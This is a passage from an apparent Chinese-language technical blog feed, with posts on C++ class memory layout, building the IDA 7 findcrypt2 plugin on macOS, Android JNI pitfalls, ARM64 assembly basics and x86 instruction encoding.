Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>IDA7.0 Mac 插件编译指南v1</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/</id>
    <published>2017-11-30T06:25:09.000Z</published>
    <updated>2019-02-21T09:59:22.403Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先说两句"><a href="#先说两句" class="headerlink" title="先说两句"></a>先说两句</h3><p>前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。</p><h3 id="搭建xcode环境"><a href="#搭建xcode环境" class="headerlink" title="搭建xcode环境"></a>搭建xcode环境</h3><p>在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。</p><p>我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_1.jpg?raw=true" alt="xcode_step_1"></p><p>然后再选择为Dynamic动态库，并导入C++标准库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_2.jpg?raw=true" alt="xcode_step_2"></p><p>接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/project_1.jpg?raw=true" alt="project_1"></p><p>这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。</p><h3 id="Build-setting"><a href="#Build-setting" class="headerlink" title="Build setting"></a>Build setting</h3><p>这里我们将设置头文件和库的搜索路径等等。</p><p>首先设置目标架构为x86_64</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/arch_s.jpg?raw=true" alt="arch_s"></p><p>然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/search_s.jpg?raw=true" alt="search_s"></p><p>经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/link_s.jpg?raw=true" alt="link_s"></p><p>这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。</p><p>最后我们还需要设置编译参数</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/macros_s.jpg?raw=true" alt="macros_s"></p><p>其中<code>__EA64__</code>在编译64位插件时才有。</p><p>这时候build一下，如果一切顺利，应该就不会报错了。</p><h3 id="最后说两句"><a href="#最后说两句" class="headerlink" title="最后说两句"></a>最后说两句</h3><p>IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为<strong>findcrypt264.dylib</strong>表示为64位插件，则对应的32位插件名为<strong>findcry.dylib</strong></p><p>下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/test.jpg?raw=true" alt="test"></p><p>上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了<strong>Ctrl-Alt-z</strong>的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>附上该插件，完。</p><p><a href="https://raw.githubusercontent.com/4ch12dy/4ch12dy.github.io/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/findcrypt264.dylib" target="_blank" rel="external">findcrypt264.dylib_for_ida7_made_by_x1a0</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><p><a href="http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html" target="_blank" rel="external">http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html</a></p></li><li><p><a href="http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/" target="_blank" rel="external">http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/</a></p></li><li><p><a href="https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile">https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile</a></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;先说两句&quot;&gt;&lt;a href=&quot;#先说两句&quot; class=&quot;headerlink&quot; title=&quot;先说两句&quot;&gt;&lt;/a&gt;先说两句&lt;/h3&gt;&lt;p&gt;前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因
      
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
      <category term="ida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>Android JNI踩坑笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_%E6%8E%89%E5%9D%91%E7%AC%94%E8%AE%B0%20/JNI/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_掉坑笔记 /JNI/</id>
    <published>2017-11-28T09:00:20.000Z</published>
    <updated>2017-11-29T03:29:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。</p></blockquote></blockquote><h3 id="坑1–jni方法签名分号问题"><a href="#坑1–jni方法签名分号问题" class="headerlink" title="坑1–jni方法签名分号问题"></a>坑1–jni方法签名分号问题</h3><p>这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名</p><pre><code class="c++">jmethodID equals_id = env-&gt;GetMethodID(string_c, &quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;);</code></pre><p>切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。</p><pre><code class="c++">jmethodID iterator_id = env-&gt;GetMethodID(list_c,&quot;iterator&quot;,&quot;()Ljava/util/Iterator;&quot;);</code></pre><p>这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。</p><h3 id="坑2–原生方法包含默认2个参数"><a href="#坑2–原生方法包含默认2个参数" class="headerlink" title="坑2–原生方法包含默认2个参数"></a>坑2–原生方法包含默认2个参数</h3><p>这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数</p><pre><code class="c++">static jboolean nativeFunction(JNIEnv *env, jobject content, jobject someObj){...}</code></pre><p>第一个保留参数为<code>JNIEnv</code>虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。</p><p>由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。</p><p>这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。</p><h3 id="坑3—jni调用父类方法的正确姿势"><a href="#坑3—jni调用父类方法的正确姿势" class="headerlink" title="坑3—jni调用父类方法的正确姿势"></a>坑3—jni调用父类方法的正确姿势</h3><p>这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找<code>Exception</code>这个类的<code>getStackTrace</code></p><p>方法时提示方法找不到错误，调了会才发现这个方法是在其父类<code>Throwable</code>中，所以正确的写法为：</p><pre><code class="c++">    jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);    jclass throwable_c = env-&gt;FindClass(&quot;java/lang/Throwable&quot;);    jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, &quot;getStackTrace&quot;,&quot;()[Ljava/lang/StackTraceElement;&quot;);</code></pre><p>那么怎么调用呢？用<code>CallNonvirtual&lt;XXX&gt;Method</code>去调用父类中的方法，一个调用例子：</p><pre><code class="c++">jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id);</code></pre><p>这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。</p><h3 id="坑4—其他小坑"><a href="#坑4—其他小坑" class="headerlink" title="坑4—其他小坑"></a>坑4—其他小坑</h3><p>写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如<code>jstring</code>与<code>char*</code>的转换，<code>LOGE()</code>函数中参数为<code>char*</code>的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下<code>jni.h</code>头文件就能找到。</p><p>还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的<code>build.gradle</code>文件中在<code>defaultConfig{}</code>加入下面的脚本：</p><pre><code class="c">        sourceSets.main{            jni.srcDirs  &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include&#39;            jniLibs.srcDir &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib&#39;        }</code></pre><p>无非是手动指定了jni相关的文件路径。</p><p>关于下面两类写法：</p><pre><code class="c++">jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);</code></pre><pre><code class="c">jclass exception_c = (*env)-&gt;FindClass(env, &quot;java/lang/Exception&quot;);</code></pre><p>原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。</p><p>继续踩坑去了…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>ARM64基础知识整理</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/21/ARM64%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/ARM64%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/21/ARM64基础知识整理/ARM64基础知识整理/</id>
    <published>2017-10-21T10:07:00.000Z</published>
    <updated>2019-03-08T07:07:58.360Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ARM64基础知识整理"><a href="#ARM64基础知识整理" class="headerlink" title="ARM64基础知识整理"></a>ARM64基础知识整理</h3><h4 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h4><h5 id="参数寄存器-X0-X7"><a href="#参数寄存器-X0-X7" class="headerlink" title="参数寄存器 (X0-X7)"></a>参数寄存器 (X0-X7)</h5><p>参数寄存器，在函数调用的时候传参使用。X0-X7分别对应8个参数，多于8个的参数保存在栈中。</p><h5 id="其他特殊寄存器"><a href="#其他特殊寄存器" class="headerlink" title="其他特殊寄存器"></a>其他特殊寄存器</h5><table><thead><tr><th style="text-align:center">X29(FP)</th><th style="text-align:center">栈帧寄存器  类比x64中rbp</th></tr></thead><tbody><tr><td style="text-align:center">X30(LR)</td><td style="text-align:center">链接寄存器，保存函数返回地址，x64该地址保存在栈中</td></tr><tr><td style="text-align:center">SP</td><td style="text-align:center">栈顶寄存器，类比x64中</td></tr><tr><td style="text-align:center">PC</td><td style="text-align:center">指向下一条指令</td></tr><tr><td style="text-align:center">寄存器</td><td style="text-align:center">描述</td></tr><tr><td style="text-align:center">CPSR</td><td style="text-align:center">状态寄存器</td></tr></tbody></table><h4 id="Instructions"><a href="#Instructions" class="headerlink" title="Instructions"></a>Instructions</h4><ul><li><code>mov</code></li></ul><pre><code class="assembly">  mov x0, x1; copies x1 into x0  mov x1, 0x4141; loads the value 0x4141 in x1</code></pre><ul><li><code>str/ldr</code></li></ul><pre><code class="assembly">str x0, [x29]; store x0 at the address in x29ldr x0, [x29]; load the value from the address in x29 into x0</code></pre><ul><li><code>stp/ldp</code></li></ul><pre><code class="assembly">stp x29, x30, [sp]; store x29 at sp and x30 at sp+8</code></pre><ul><li><code>b/br</code></li></ul><pre><code class="assembly"> br x0; jump to the address stored in x0</code></pre><ul><li><code>ret</code></li></ul><pre><code>Unlike it’s x86 equivalent which pops the return address from stack, it looks for the return address in the x30 register and jumps there.</code></pre><h4 id="Indexing-modes"><a href="#Indexing-modes" class="headerlink" title="Indexing modes"></a>Indexing modes</h4><ul><li>Immediate offset : <code>[base, #offset]</code> - Index an offset directly and don’t mess with anything else</li></ul><pre><code class="assembly">ldr x0, [sp, 0x10]; load x0 from sp+0x10</code></pre><ul><li>Pre-indexed : <code>[base, #offset]!</code> - Almost the same as above, except that base+offset is written back into base.</li></ul><pre><code class="assembly">ldr x0, [sp, 0x10]!; load x0 from sp+0x10 and then increase sp by 0x10</code></pre><ul><li>Post-indexed : <code>[base], #offset</code> - Use the base directly and then write base+offset back into the base</li></ul><pre><code class="assembly">ldr x0, [sp], 0x10; load x0 from sp and then increase sp by 0x10</code></pre><h4 id="函数调用demo分析"><a href="#函数调用demo分析" class="headerlink" title="函数调用demo分析"></a>函数调用demo分析</h4><pre><code class="assembly">__text:000000010004F0D4                 SUB             SP, SP, #0x70__text:000000010004F0D8                 STP             X24, X23, [SP,#0x60+var_30]__text:000000010004F0DC                 STP             X22, X21, [SP,#0x60+var_20]__text:000000010004F0E0                 STP             X20, X19, [SP,#0x60+var_10]__text:000000010004F0E4                 STP             X29, X30, [SP,#0x60+var_s0]__text:000000010004F0E8                 ADD             X29, SP, #0x60__text:000000010004F0EC                 MOV             X19, X0__text:000000010004F0F0                 ADRP            X8, #___stack_chk_guard_ptr@PAGE__text:000000010004F0F4                 LDR             X8, [X8,#___stack_chk_guard_ptr@PAGEOFF]__text:000000010004F0F8                 LDR             X8, [X8]__text:000000010004F0FC                 STR             X8, [SP,#0x60+var_38]__text:000000010004F100                 ADRP            X8, #classRef_Fabric@PAGE__text:000000010004F104                 LDR             X20, [X8,#classRef_Fabric@PAGEOFF]__text:000000010004F108                 NOP__text:000000010004F10C                 LDR             X0, [X8,#classRef_Crashlytics@PAGEOFF] ; void *__text:000000010004F110                 ADRP            X8, #selRef_class@PAGE__text:000000010004F114                 LDR             X1, [X8,#selRef_class@PAGEOFF] ; char *__text:000000010004F118                 BL              _objc_msgSend...__text:000000010004F2F4                 LDP             X29, X30, [SP,#0x60+var_s0]__text:000000010004F2F8                 LDP             X20, X19, [SP,#0x60+var_10]__text:000000010004F2FC                 LDP             X22, X21, [SP,#0x60+var_20]__text:000000010004F300                 LDP             X24, X23, [SP,#0x60+var_30]__text:000000010004F304                 ADD             SP, SP, #0x70__text:000000010004F308                 RET</code></pre><table><thead><tr><th style="text-align:center">地址</th><th style="text-align:center">栈值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">sp=sp-0x70</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x60</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x50</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x40</td><td style="text-align:center">X24/X23</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">sp-0x30</td><td style="text-align:center">X22/X21</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">sp-0x20</td><td style="text-align:center">X20/X19</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">X29 –&gt; sp-0x10</td><td style="text-align:center">X29/X30</td><td style="text-align:center">保存前栈基址和返回地址</td></tr><tr><td style="text-align:center">sp=sp</td><td style="text-align:center"></td><td style="text-align:center">调用前的栈顶地址</td></tr></tbody></table><h4 id="Arm32"><a href="#Arm32" class="headerlink" title="Arm32"></a>Arm32</h4><p><img src="https://azeria-labs.com/downloads/cheatsheetv1.2-1920x1080.png" alt="arm32"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://www.jianshu.com/p/2f4a5f74ac7a" target="_blank" rel="external">https://www.jianshu.com/p/2f4a5f74ac7a</a></li><li><a href="https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start" target="_blank" rel="external">https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start</a></li><li><a href="https://blog.perfect.blue/ROPing-on-Aarch64" target="_blank" rel="external">https://blog.perfect.blue/ROPing-on-Aarch64</a></li><li><a href="https://azeria-labs.com/assembly-basics-cheatsheet/" target="_blank" rel="external">https://azeria-labs.com/assembly-basics-cheatsheet/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ARM64基础知识整理&quot;&gt;&lt;a href=&quot;#ARM64基础知识整理&quot; class=&quot;headerlink&quot; title=&quot;ARM64基础知识整理&quot;&gt;&lt;/a&gt;ARM64基础知识整理&lt;/h3&gt;&lt;h4 id=&quot;Register&quot;&gt;&lt;a href=&quot;#Register&quot;
      
    
    </summary>
    
      <category term="assembly" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/assembly/"/>
    
    
      <category term="ARM64" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ARM64/"/>
    
  </entry>
  
  <entry>
    <title>X86指令编码笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86指令编码笔记/X86指令编码笔记/</id>
    <published>2017-10-11T03:46:13.000Z</published>
    <updated>2019-02-21T10:03:24.082Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。</p></blockquote><h3 id="x86指令编码格式"><a href="#x86指令编码格式" class="headerlink" title="x86指令编码格式"></a>x86指令编码格式</h3><p>很多时候我们都是查阅指令参考页去了解一个指令的含义，但这并不能理解指令的编码格式。而只有学会看懂opcode表的时候才是王道。</p><p>x86是一种CISC指令集，CISC的全称是“Complex Instruction Set Computer”，表示的是一种复杂的指令集，其中一个最重要的复杂性在于在这个指令集中，指令是不定长的，要使得CPU在这种不定长的指令集里面确定每一条指令的含义，就需要一种特定的指令格式，下图显示了<code>Intel 64</code>和<code>IA-32</code>架构下的指令格式，当然，这两种架构所采用的都是x86指令编码：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F.png?raw=true" alt="指令编码格式"></p><p>从上面可以看出，x86指令格式中，由6部分组成，但在这之中只有opcode是必须的，其余都是可选。我们稍后就介绍这些组成部分。</p><h3 id="指令prefix"><a href="#指令prefix" class="headerlink" title="指令prefix"></a>指令prefix</h3><p>prefix简单的说来就是调整内存操作数属性，增强指令的作用等。</p><ul><li><p><code>lock</code> 和 <code>repeat</code></p><p>其中，LOCK prefix保证该条指令对共享内存的访问是独占的；而repeat prefixes 表示这条指令会重复执行多次，直到某个条件满足位置。其中第二种repeat prefix只能用在对string的操作，或者对I/O的操作上。</p></li><li><p><code>operand-size override</code> （<strong>66H </strong>— 改变默认操作数大小）</p><p>这个prefix主要是在解析指令的操作数的时候，可以在十六位或者三十二位的操作数大小间进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/operand_size_override.png?raw=true" alt="operand_size_override"></p></li><li><p><code>address-size override</code> （<strong>67H</strong> — 改变默认操作数地址大小）</p><p>这个prefix主要是在进行指令寻址的时候，可以在十六位或者三十二位的地址大小中进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/address_override.png?raw=true" alt="address_override"></p></li><li><p><code>segment override</code>，<code>branch hints</code> 和 <code>bound</code></p><p>其中，segment override prefix会在执行这条指令的时候将默认的段寄存器给换掉；branch hints prefix主要应用在条件跳转指令（Jcc）中，可以协助CPU进行指令的prefetch；而bound prefix主要是用intel MPX硬件特性上。</p><p>​</p><p>| 2E          | 3E          | 26          | 64          | 65          | 36          |<br>| ———– | ———– | ———– | ———– | ———– | ———– |<br>| CS register | DS register | ES register | FS register | GS register | SS register |</p></li></ul><h4 id="REX-prefix—开启-64-位计算的基石"><a href="#REX-prefix—开启-64-位计算的基石" class="headerlink" title="REX prefix—开启 64 位计算的基石"></a>REX prefix—开启 64 位计算的基石</h4><p>REX prefix 是不定值，它的取值范围是：40 - 4F （共 16 个）</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>0</td><td>W</td><td>R</td><td>X</td><td>B</td></tr></tbody></table><ul><li>W: operand width 标志位，当 W = 0 时使用 default operand size,当 W = 1 时使用 64 位 operand size</li><li>R: 用来扩展 ModRM.reg 域</li><li>X: 用来扩展 SIB.index 域</li><li>B: 用来扩展 SIB.base, ModRM.r/m 以及 Opcode.reg</li></ul><h5 id="寄存器编码表"><a href="#寄存器编码表" class="headerlink" title="寄存器编码表"></a>寄存器编码表</h5><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/register_table.png?raw=true" alt="register_table"></p><p>下面来分析这条指令：</p><p><code>mov eax,ebx</code></p><p>正常编码为：<code>89 d8</code>  下面看看在不同的<code>REX.W</code>和<code>66H prefix</code>下的不同：</p><ul><li><p><code>48 89 d8</code>——————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 48 89 d8</code>—————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 40 89 d8</code>—————&gt; <code>mov ax, bx</code></p><p>​</p></li></ul><p>第 1 条指令编码使用 REX prefix 扩展访问 64 位寄存器，<strong>REX.W = 1</strong></p><p>第 2 条指令编码加上了 <strong>66H prefix</strong> 同时还有 REX prefix（<strong>REX.W = 1</strong>），此时一般会认为产生了冲突：是使用 64 位还是 16 位 operand size 呢？<br>实际上，很简单！<strong>48H 位于 66H 后面，66H 将被覆盖！</strong>也就是说：66H prefix 将会被忽略，REX prefix 产生了作用！因此：指令的 <strong>operand size 是 64 位</strong>的。</p><p>第 3 条指令编码也同样使用了 <strong>66H prefix </strong>和 <strong>REX prefix</strong>，但是 <strong>REX.W = 0</strong> 意味着不改变原来的 operand size！<br>在这种情况下，<strong>REX prefix 不会与 66H prefix 产生冲突</strong>，最终的作用于 66H prefix，因此 <strong>operand size 是 16 位</strong>的。</p><h3 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h3><p>整个编码中opcode是必须的，因为代表着这条指令的含义，整个指令的核心，且prefix与Opcode共享00~FF的空间。</p><p>一个opcode可以由一个byte组成，我们称之为<code>1-byte opcode</code>，当然，与之对应的，就有<code>2-bytes opcode</code>和<code>3-bytes opcode</code>。其中，后两者一般会有一个被称为<code>escape opcode</code>的byte进行引导，该byte的数值是<code>0FH</code>。所以，一般情况下，<code>2-bytes opcode</code>就是<code>0FH</code>后面再加一个byte，而<code>3-bytes opcode</code>就是<code>0FH</code>后面再加两个bytes。</p><h3 id="ModR-M"><a href="#ModR-M" class="headerlink" title="ModR/M"></a>ModR/M</h3><p>ModRM在指令中非常重要，是理解x86平台opcode的关键，决定着寻址模式。</p><p>由一个byte组成，其格式如下：</p><table><thead><tr><th>7 6</th><th>5 4 3</th><th>2 1 0</th></tr></thead><tbody><tr><td>mod</td><td>reg</td><td>R/M</td></tr></tbody></table><p><strong>1、mod：寻址模式。</strong><br>　　2位组成4种寻址模式，总的来说，只有两种寻址模式，就是：内存寻址模式和寄存器寻址模式。</p><ul><li>mod = 11指出寄存器寻址模式，mod = 00 ~ 10 时指出内存寻址模式：</li></ul><ul><li>mod = 00，定义 [register] 间接寻址，无displacement值。</li><li>mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。</li><li>mod = 10，定义 [register + disp32]，有32位displacement偏移值。</li></ul><p><strong>2、reg：寄存器ID值</strong><br>　　3位组成8个寄存器ID值，从 000 ~ 111，对应于 RAX、RCX、RDX、RBX、RSP、RBP、RSI以及RDI。这个ID值可以被REX prefix扩充为4位，范围从 0000 ~ 1111可表示16个寄存器。</p><p>reg域的另一含义是对Opcode的补充，对分为一组Opcode的进行选择（Group属性）。</p><p><strong>3、r/m：意即register / memory。</strong></p><p>​     提供对registers或memory的寻址，也用来表示寄存器ID，当是registers时是寄存器ID值。当是memory时是寄存器间接寻址中的寄存器ID值。当mod != 11 时，r/m 表示 [rax] ~ [rdi]，REX prefix用来扩充寄存器ID值。</p><blockquote><p>注意:</p><p>(1) 如果像这条指令：mov eax, [eax+ecx<em>2+0x0c] 在这条指令里eax是base寄存器，ecx是Index寄存器，2是scale，还有一个displacement 